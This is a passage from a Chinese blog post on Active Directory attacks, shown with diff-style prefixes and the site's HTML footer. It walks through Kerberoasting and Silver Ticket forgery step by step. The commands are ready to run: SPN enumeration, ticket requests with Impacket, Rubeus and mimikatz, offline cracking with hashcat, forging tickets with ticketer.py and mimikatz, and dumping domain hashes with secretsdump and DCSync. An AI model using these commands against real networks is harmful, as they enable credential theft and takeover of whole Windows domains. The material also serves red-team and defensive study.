+<p>由于ST是用服务的Hash进行加密的，因此客户端拿到该ST后可以用于本地离线爆破。如果字典够牛逼，那么就很有可能爆破出SPN链接用户的明文密码<br>如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域</p>
+<p>其<strong>核心</strong>在于，攻击者和KDC协商ST加密的时候，协商的是使用<strong>RC4_HMAC_MD5</strong>加密算法，而该加密算法容易被破解，因为攻击者可以在本地进行离线爆破</p>
+<p><strong>Kerberoasting的前提</strong>：服务SPN必须注册在域用户账户下，因为机器账户的密码是随机生成的，基本爆破不了</p>
+<p>攻击过程：</p>
+<ol>
+<li>攻击者提供一个正常的域用户密码进行认证，获得TGT</li>
+<li>攻击者使用该TGT请求针对指定SPN的ST</li>
+<li>KDC在验证身份后，返回服务Hash加密的ST，不管提供的域用户有没有对指定SPN服务的访问权限</li>
+<li>攻击者本地离线爆破ST，获得SPN所链接账户的明文密码</li>
+</ol>
+<p>攻击流程：</p>
+<ol>
+<li>查询域内注册于域用户的SPN</li>
+<li>请求指定SPN的ST</li>
+<li>导出请求的ST</li>
+<li>对该ST进行离线爆破</li>
+</ol>
+<h4 id="SPN的发现"><a href="#SPN的发现" class="headerlink" title="SPN的发现"></a>SPN的发现</h4><p>默认情况下，域内会有个注册在krbtgt下的SPN kadmin&#x2F;changepw，但是该SPN对于kerberoasting是没有用的，因为krbtgt的密码是随机生成的，几乎不可能爆破</p>
+<p>所以需要使用以下工具，找到其他的SPN</p>
+<p><strong>1.<a target="_blank" rel="noopener" href="https://github.com/cyberark/RiskySPN">RiskySPN</a></strong></p>
+<p>RiskySPNs 是一组 PowerShell 脚本，专注于检测和滥用与 SPN（服务主体名称）关联的帐户。该模块可以帮助蓝队识别有潜在风险的 SPN，并帮助红队利用 Kerberos 和 Active Directory 提升权限</p>
+<p><strong>可以用来查找当前域内注册在用户下的可能包含弱密码的SPN</strong></p>
+<pre><code class="powershell">Import-Module .\RiskySPNs.psm1
+Find-PotentiallyCrackableAccounts#查找易受攻击的
+</code></pre>
+<p>他还可以直接请求ST</p>
+<p><strong>为 SPN 请求 Kerberos TGS</strong></p>
+<pre><code>Get-TGSCipher -SPN &quot;MSSQLSvc/prodDB.company.com:1433&quot;
+</code></pre>
+<p>或者</p>
+<pre><code>Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher
+</code></pre>
+<p>有趣的东西:)，这个应该是获取ST里的服务HASH</p>
+<pre><code>Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format &quot;Hashcat&quot; | Out-File crack.txt
+oclHashcat64.exe -m 13100 crack.txt -a 3
+</code></pre>
+<p><strong>2.GetUserSPNs</strong></p>
+<p>是<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">kerberoast</a>里的一个查询注册于域内用户下的SPN的脚本</p>
+<p>有vs和powershell两种，可以查询域内所以注册在用户下的SPN，包括注册于krbtgt下的kadmin&#x2F;changepw</p>
+<pre><code class="powershell">#vbs
+cscript .\GetUserSPNs.vbs
+#powerhshell
+Import-Module .\GetUserSPNs.ps1
+</code></pre>
+<p><strong>3.<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">Powerview.ps1</a></strong></p>
+<p>是Powersploit中Recon目录下的powershell脚本文件</p>
+<p>可以查询域内所以注册在用户下的SPN，包括krbtgt用户，并返回详细信息</p>
+<pre><code class="powershell">Import-Muole .\PowerView.ps1
+Get-NetUser -SPN
+</code></pre>
+<h4 id="请求服务票据（ST）"><a href="#请求服务票据（ST）" class="headerlink" title="请求服务票据（ST）"></a>请求服务票据（ST）</h4><p><strong>1.Impacket请求</strong></p>
+<p><code>GeyUserSPNs.py</code>可以用来请求注册于用户下的所有SPN的服务票据，也可以请求注册于指定用户下的SPN的服务器票据</p>
+<pre><code class="bash">#请求注册于用户下的所有SPN服务票据，并保存为hashcat可以破解的格式
+python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:password -outputfile hash.txt
+#请求指定用户hack下的SPN服务票据，并保存为hashcat可以破解的格式
+python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:password -outputfile hash.txt -request-user hack
+</code></pre>
+<p><strong>2.Rebeus请求</strong></p>
+<p>Rebeus支持对所有用户或特定用户执行Kerberoasting操作，原理是先用LDAP查询域内所有注册在域用户下的SPN（除了kadmin&#x2F;changpw），再通过发送TGS包，直接输出能使用John或hashcat爆破的hash</p>
+<pre><code class="bash">#请求注册于用户下的所有SPN服务票据，并保存为hashcat可以破解的格式
+Rebeus.exe kerberoast /format:hashcat /outfile:hash.txt
+#请求指定用户下的指定SPN服务票据，并保存为john可以破解的格式
+Rebeus.exe kerberoast /spn:SQLSERVER/win7.xie.com:1443/MSSQL  /format:john /outfile:hash.tx
+</code></pre>
+<p><strong>3.mimikatz请求</strong></p>
+<p>请求指定SPN的服务票据，请求的ST将保存在内存中</p>
+<pre><code class="bash">kerberos::ask /target:SQLSERVER/win7.xie.com:1443/MSSQL
+</code></pre>
+<h4 id="导出内存中的服务票据"><a href="#导出内存中的服务票据" class="headerlink" title="导出内存中的服务票据"></a>导出内存中的服务票据</h4><p>因为有的工具请求的票据是保存在内存中的，所以需要将其导出，才能进行爆破</p>
+<p><strong>1.查看内存中的票据</strong></p>
+<pre><code class="bash">#cmd命令行
+klist
+#mimikatz里
+kerberos::list
+</code></pre>
+<p><strong>2.使用mimikatz导出票据</strong></p>
+<p>得到.kirbi格式的文件</p>
+<pre><code class="bash">mimikatz.exe &quot;kerberos::list /export&quot; exit
+</code></pre>
+<p><strong>3.使用Empire导出票据</strong></p>
+<p>Empire下的<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1"><strong>Invoke-Kerberoast.ps1</strong></a>可以导出内存中的票据，并以hashcat或者john的格式保存</p>
+<pre><code class="bash">Import-Module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -outputFormat hashcat
+</code></pre>
+<h4 id="离线爆破票据"><a href="#离线爆破票据" class="headerlink" title="离线爆破票据"></a>离线爆破票据</h4><p><strong>1.kerberoast</strong></p>
+<p>Kerberoast下的<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrepcrack.py</a>，可以离线爆破.kirbi格式的票据</p>
+<pre><code class="bash">python2 tgsrepcrack.py pass.txt &lt;xxx.kribi&gt;
+</code></pre>
+<p><strong>2.<a target="_blank" rel="noopener" href="https://github.com/leechristensen/tgscrack">tgscrack</a></strong></p>
+<p>先将.kribi格式的文件转换成这个工具可爆破的格式，再使用这个go脚本进行爆破</p>
+<pre><code class="bash">python2 extractServiceTicketParts.py xxxx.kribi &gt; hash.txt
+go run tgscrack.go -hashfile hash.txt -wordlist pass.txt
+</code></pre>
+<p><strong>3.hashcat</strong></p>
+<p>针对Rebeus和Impacket请求的票据</p>
+<pre><code class="bash">hashcat -m 13100 hash.txt pass.txt --force -o 
+</code></pre>
+<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><blockquote>
+<p>在TGS_REP阶段返回的ST中的authorization-data是使用服务密钥加密的，而authorization-data里存放着代表用户的PAC，并且这个阶段的PAC的PAC_SERVER_CHECKSUM签名的密钥也是服务密钥（该阶段PAC的PAC_PRIVSVR_CHECKSUM签名的密钥是krbtgt密钥，此时客户端不能伪造PAC_SERVER_CHECKSUM签名）。但是由于 PAC_SERVER_CHECKSUM签名是可选的且默认不开启，所以可以在不伪造PAC_SERVER_CHECKSUM签名的情况下进行攻击</p>
+</blockquote>
+<p>就是在PAC没有配置PAC_SERVER_CHECKSUM签名的时候，只要获得指定服务的密钥，就能伪造高权限的用户来使用这个ST，以高权限的身份访问指定服务</p>
+<p>创建白银票据的条件：</p>
+<ul>
+<li>目标服务的密钥</li>
+<li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot] </li>
+<li>域的SID值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value] </li>
+<li>要伪造的用户，比如域管理员</li>
+</ul>
+<p>和黄金票据不同的是，白银票据只能<strong>访问指定服务</strong>，且白银票据的生成不与KDC进行通信，所以不会在KDC上留下日志，只会在目标服务器上留下日志。而黄金票据会在KDC上留下日志</p>
+<p><strong>使用impacket进行攻击</strong></p>
+<p>使用Impacket下的ticketer.py脚本来离线生成白银票据，然后将票据导入，即可以使用secretsdump.py、smbexec.py进行利用</p>
+<p>需要在hosts文件里添加服务对应的ip</p>
+<pre><code class="bash">#生成白银票据
+python3 ticketer.py -domian-sid &lt;sid&gt; -nthash &lt;server-hash&gt; -spn &lt;server-name&gt; -domain &lt;domain-name&gt; &lt;user&gt;
+#导入票据
+export KRB5CCNAME=&lt;user&gt;.ccache
+#远程连接服务所在的主机，如果是域控上的服务，就可以直接连接域控了
+python3 smbexec.py -no-pass -k &lt;user&gt;@&lt;domain&gt; -dc-ip &lt;dcip&gt;
+#如果是域控的服务，可以导出指定用户的hash
+python3 secretsdump.py -k -no-pass &lt;user&gt;@&lt;domain&gt; -dc-ip &lt;dcip&gt; -just-dc-user &lt;target-user&gt;
+</code></pre>
+<p><strong>使用mimikatz进行攻击</strong></p>
+<p>使用mimikatz进行攻击的时候，利用的机器可以是域内的普通机器，也可以不是域内的机器</p>
+<p>当利用的机器不在域中时，需要将DNS服务器设置为域控</p>
+<pre><code class="bash">mimikatz.exe
+#生成白银票据并导入当前内存
+Kerberos::golden /user:Administrator /domain:controller.local /sid:&lt;domain-sid&gt; /target:&lt;目标计算机名&gt; /service:&lt;要访问的服务&gt; /rc4:&lt;目标计算机的NTLM hash值&gt; /user:&lt;user&gt; /ptt
+# 验证是否成功，导出用户krbtgt的hash(如果目标服务是域控上的服务)
+lsadump:dcsync /domain:xie.com /user:krbtgt /csv
+</code></pre>
+<p><strong>使用cs进行攻击</strong></p>
+<p>不做赘述，他自带有图形化操作界面</p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/AD%E5%9F%9F/'>
+                            AD域
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/'>
+                            内网渗透
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
